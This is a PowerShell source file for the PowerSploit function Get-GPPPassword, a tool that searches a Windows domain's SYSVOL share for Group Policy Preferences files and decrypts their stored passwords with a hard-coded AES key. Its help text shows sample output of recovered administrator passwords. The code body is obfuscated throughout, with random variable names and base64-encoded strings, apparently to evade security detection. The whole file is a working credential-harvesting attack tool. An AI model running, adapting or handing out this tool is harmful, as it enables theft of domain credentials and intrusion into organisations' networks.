function Get-GPPPassword {
<#
.SYNOPSIS

    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.

    PowerSploit Function: Get-GPPPassword
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION

    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.

.EXAMPLE

    PS C:\> Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml

    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml

    NewName   : [BLANK]
    Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
    Passwords : {password, password1234$}
    UserNames : {administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml

    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {DEMO\Administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml

.EXAMPLE

    PS C:\> Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
    
    password
    password12
    password123
    password1234
    password1234$
    read123
    Recycling*3ftw!

.LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
#>
    [CmdletBinding()]
    Param ()
    Set-StrictMode -Version 2
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] ${e4aae6794a454054ab0e31882001249c} 
        )
        try {
            ${205bb5891ffe47f5b576b5bbe1811082} = (${e4aae6794a454054ab0e31882001249c}.length % 4)
            switch (${205bb5891ffe47f5b576b5bbe1811082}) {
            '1' {${e4aae6794a454054ab0e31882001249c} = ${e4aae6794a454054ab0e31882001249c}.Substring(0,${e4aae6794a454054ab0e31882001249c}.Length -1)}
            '2' {${e4aae6794a454054ab0e31882001249c} += ('=' * (4 - ${205bb5891ffe47f5b576b5bbe1811082}))}
            '3' {${e4aae6794a454054ab0e31882001249c} += ('=' * (4 - ${205bb5891ffe47f5b576b5bbe1811082}))}
            }
            ${2beff11a79b9489db2695bbc9c70d3b6} = [Convert]::FromBase64String(${e4aae6794a454054ab0e31882001249c})
            ${0b8fd8afaef146ef856ffdf1593f5587} = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            ${fa2e77277a0e43cb89bb5a2e099cb613} = New-Object Byte[](${0b8fd8afaef146ef856ffdf1593f5587}.IV.Length) 
            ${0b8fd8afaef146ef856ffdf1593f5587}.IV = ${fa2e77277a0e43cb89bb5a2e099cb613}
            ${0b8fd8afaef146ef856ffdf1593f5587}.Key = $AesKey
            ${91bd48cd909f4b91a7f46f9969d0001d} = ${0b8fd8afaef146ef856ffdf1593f5587}.CreateDecryptor() 
            [Byte[]] $OutBlock = ${91bd48cd909f4b91a7f46f9969d0001d}.TransformFinalBlock(${2beff11a79b9489db2695bbc9c70d3b6}, 0, ${2beff11a79b9489db2695bbc9c70d3b6}.length)
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        catch {Write-Error $Error[0]}
    }  
    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param (
            ${b1372a912a6c4da5b57ac2089f6eb19b} 
        )
        try {
            ${5e1021a707344c0e91486ac863355fda} = Split-Path ${b1372a912a6c4da5b57ac2089f6eb19b} -Leaf
            [xml] $Xml = gc (${b1372a912a6c4da5b57ac2089f6eb19b})
            ${e4aae6794a454054ab0e31882001249c} = @()
            ${aae7b762662c4728a463d10885e00a19} = @()
            ${0c502df0b6474f4d8f075877af0af87d} = @()
            ${b4166a3f22e74d49aad4b9e8ed582950} = @()
            ${3c1ee35bd9b94daba7c6354654745097} = @()
            if ($Xml.innerxml -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHAAYQBzAHMAdwBvAHIAZAAqAA==')))){
                Write-Verbose "Potential password in ${b1372a912a6c4da5b57ac2089f6eb19b}"
                switch (${5e1021a707344c0e91486ac863355fda}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAHMALgB4AG0AbAA='))) {
                        ${e4aae6794a454054ab0e31882001249c} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABjAHAAYQBzAHMAdwBvAHIAZAA='))) | select -Expand Node | % {$_.Value}
                        ${aae7b762662c4728a463d10885e00a19} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQAB1AHMAZQByAE4AYQBtAGUA'))) | select -Expand Node | % {$_.Value}
                        ${0c502df0b6474f4d8f075877af0af87d} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABuAGUAdwBOAGEAbQBlAA=='))) | select -Expand Node | % {$_.Value}
                        ${b4166a3f22e74d49aad4b9e8ed582950} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAHIAbwB1AHAAcwAvAFUAcwBlAHIALwBAAGMAaABhAG4AZwBlAGQA'))) | select -Expand Node | % {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAC4AeABtAGwA'))) {  
                        ${e4aae6794a454054ab0e31882001249c} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBOAFQAUwBlAHIAdgBpAGMAZQBzAC8ATgBUAFMAZQByAHYAaQBjAGUALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABjAHAAYQBzAHMAdwBvAHIAZAA='))) | select -Expand Node | % {$_.Value}
                        ${aae7b762662c4728a463d10885e00a19} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBOAFQAUwBlAHIAdgBpAGMAZQBzAC8ATgBUAFMAZQByAHYAaQBjAGUALwBQAHIAbwBwAGUAcgB0AGkAZQBzAC8AQABhAGMAYwBvAHUAbgB0AE4AYQBtAGUA'))) | select -Expand Node | % {$_.Value}
                        ${b4166a3f22e74d49aad4b9e8ed582950} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBOAFQAUwBlAHIAdgBpAGMAZQBzAC8ATgBUAFMAZQByAHYAaQBjAGUALwBAAGMAaABhAG4AZwBlAGQA'))) | select -Expand Node | % {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAdABhAHMAawBzAC4AeABtAGwA'))) {
                        ${e4aae6794a454054ab0e31882001249c} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAHMALwBUAGEAcwBrAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAYwBwAGEAcwBzAHcAbwByAGQA'))) | select -Expand Node | % {$_.Value}
                        ${aae7b762662c4728a463d10885e00a19} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAHMALwBUAGEAcwBrAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAcgB1AG4AQQBzAA=='))) | select -Expand Node | % {$_.Value}
                        ${b4166a3f22e74d49aad4b9e8ed582950} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAHMALwBUAGEAcwBrAC8AQABjAGgAYQBuAGcAZQBkAA=='))) | select -Expand Node | % {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBTAG8AdQByAGMAZQBzAC4AeABtAGwA'))) { 
                        ${e4aae6794a454054ab0e31882001249c} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAGEAdABhAFMAbwB1AHIAYwBlAHMALwBEAGEAdABhAFMAbwB1AHIAYwBlAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAYwBwAGEAcwBzAHcAbwByAGQA'))) | select -Expand Node | % {$_.Value}
                        ${aae7b762662c4728a463d10885e00a19} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAGEAdABhAFMAbwB1AHIAYwBlAHMALwBEAGEAdABhAFMAbwB1AHIAYwBlAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAdQBzAGUAcgBuAGEAbQBlAA=='))) | select -Expand Node | % {$_.Value}
                        ${b4166a3f22e74d49aad4b9e8ed582950} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAGEAdABhAFMAbwB1AHIAYwBlAHMALwBEAGEAdABhAFMAbwB1AHIAYwBlAC8AQABjAGgAYQBuAGcAZQBkAA=='))) | select -Expand Node | % {$_.Value}                          
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAC4AeABtAGwA'))) { 
                        ${e4aae6794a454054ab0e31882001249c} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAHIAaQBuAHQAZQByAHMALwBTAGgAYQByAGUAZABQAHIAaQBuAHQAZQByAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAYwBwAGEAcwBzAHcAbwByAGQA'))) | select -Expand Node | % {$_.Value}
                        ${aae7b762662c4728a463d10885e00a19} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAHIAaQBuAHQAZQByAHMALwBTAGgAYQByAGUAZABQAHIAaQBuAHQAZQByAC8AUAByAG8AcABlAHIAdABpAGUAcwAvAEAAdQBzAGUAcgBuAGEAbQBlAA=='))) | select -Expand Node | % {$_.Value}
                        ${b4166a3f22e74d49aad4b9e8ed582950} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBQAHIAaQBuAHQAZQByAHMALwBTAGgAYQByAGUAZABQAHIAaQBuAHQAZQByAC8AQABjAGgAYQBuAGcAZQBkAA=='))) | select -Expand Node | % {$_.Value}
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAHMALgB4AG0AbAA='))) { 
                        ${e4aae6794a454054ab0e31882001249c} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAHIAaQB2AGUAcwAvAEQAcgBpAHYAZQAvAFAAcgBvAHAAZQByAHQAaQBlAHMALwBAAGMAcABhAHMAcwB3AG8AcgBkAA=='))) | select -Expand Node | % {$_.Value}
                        ${aae7b762662c4728a463d10885e00a19} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAHIAaQB2AGUAcwAvAEQAcgBpAHYAZQAvAFAAcgBvAHAAZQByAHQAaQBlAHMALwBAAHUAcwBlAHIAbgBhAG0AZQA='))) | select -Expand Node | % {$_.Value}
                        ${b4166a3f22e74d49aad4b9e8ed582950} += , $Xml | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBEAHIAaQB2AGUAcwAvAEQAcgBpAHYAZQAvAEAAYwBoAGEAbgBnAGUAZAA='))) | select -Expand Node | % {$_.Value} 
                    }
                }
           }
           foreach ($Pass in ${e4aae6794a454054ab0e31882001249c}) {
               Write-Verbose "Decrypting $Pass"
               ${21604aea1ec54a688b80a97d1c38ab95} = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of ${21604aea1ec54a688b80a97d1c38ab95}"
               ${3c1ee35bd9b94daba7c6354654745097} += , ${21604aea1ec54a688b80a97d1c38ab95}
           }
            if (!(${3c1ee35bd9b94daba7c6354654745097})) {${3c1ee35bd9b94daba7c6354654745097} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            if (!(${aae7b762662c4728a463d10885e00a19})) {${aae7b762662c4728a463d10885e00a19} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            if (!(${b4166a3f22e74d49aad4b9e8ed582950})) {${b4166a3f22e74d49aad4b9e8ed582950} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            if (!(${0c502df0b6474f4d8f075877af0af87d})) {${0c502df0b6474f4d8f075877af0af87d} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBCAEwAQQBOAEsAXQA=')))}
            ${98e95e02299745609b19392a6259cb51} = @{'Passwords' = ${3c1ee35bd9b94daba7c6354654745097};
                                  'UserNames' = ${aae7b762662c4728a463d10885e00a19};
                                  'Changed' = ${b4166a3f22e74d49aad4b9e8ed582950};
                                  'NewName' = ${0c502df0b6474f4d8f075877af0af87d};
                                  'File' = ${b1372a912a6c4da5b57ac2089f6eb19b}}
            ${069964c2c7d14dad9c2b57e19a7a4099} = New-Object -TypeName PSObject -Property ${98e95e02299745609b19392a6259cb51}
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABwAGEAcwBzAHcAbwByAGQAIABpAHMAIABiAGUAdAB3AGUAZQBuACAAewB9ACAAYQBuAGQAIABtAGEAeQAgAGIAZQAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGUAIAB2AGEAbAB1AGUALgA=')))
            if (${069964c2c7d14dad9c2b57e19a7a4099}) {Return ${069964c2c7d14dad9c2b57e19a7a4099}} 
        }
        catch {Write-Error $Error[0]}
    }
    try {
        if ( ( ((gwmi Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQAgAGkAcwAgAG4AbwB0ACAAYQAgAGQAbwBtAGEAaQBuACAAbQBlAG0AYgBlAHIAIABvAHIAIABVAHMAZQByACAAaQBzACAAbgBvAHQAIABhACAAbQBlAG0AYgBlAHIAIABvAGYAIAB0AGgAZQAgAGQAbwBtAGEAaQBuAC4A')))
        }
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIAB0AGgAZQAgAEQAQwAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHQAYQBrAGUAIABhACAAdwBoAGkAbABlAC4A')))
        ${8a83da17e81e465a99ef9e9a98706449} = ls -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAHMALgB4AG0AbAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAdABhAHMAawBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBTAG8AdQByAGMAZQBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0AGUAcgBzAC4AeABtAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAByAGkAdgBlAHMALgB4AG0AbAA=')))
        if ( -not ${8a83da17e81e465a99ef9e9a98706449} ) {throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcAByAGUAZgBlAHIAZQBuAGMAZQAgAGYAaQBsAGUAcwAgAGYAbwB1AG4AZAAuAA==')))}
        Write-Verbose "Found $(${8a83da17e81e465a99ef9e9a98706449} | measure | select -ExpandProperty Count) files that could contain passwords."
        foreach (${b1372a912a6c4da5b57ac2089f6eb19b} in ${8a83da17e81e465a99ef9e9a98706449}) {
            ${bb5b513521294a3aaa8d8c72789a026e} = (Get-GppInnerFields ${b1372a912a6c4da5b57ac2089f6eb19b}.Fullname)
            echo ${bb5b513521294a3aaa8d8c72789a026e}
        }
    }
    catch {Write-Error $Error[0]}
}
